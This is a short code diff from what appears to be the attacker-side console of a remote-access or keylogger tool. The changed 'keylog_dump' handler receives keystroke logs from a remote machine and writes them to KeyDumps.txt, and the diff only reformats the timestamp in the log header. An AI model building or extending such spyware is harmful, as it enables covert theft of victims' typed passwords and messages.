@@ -74,7 +74,7 @@ def shell():
 		elif command[:11] == "keylog_dump":
 			result = reliable_recv()
 			save_log = open('KeyDumps.txt','w')
-			header = "\n\n------------------------------------"+ str(time.time())+"------------------------------------ \n\n"
+			header = "\n\n------------------------------------"+ str(time.ctime(time.time()))+"------------------------------------ \n\n"
 			save_log.write(header + result)
 			save_log.close()
 			print(colored("[+] Saved Logs as KeyDumps.txt","green"))
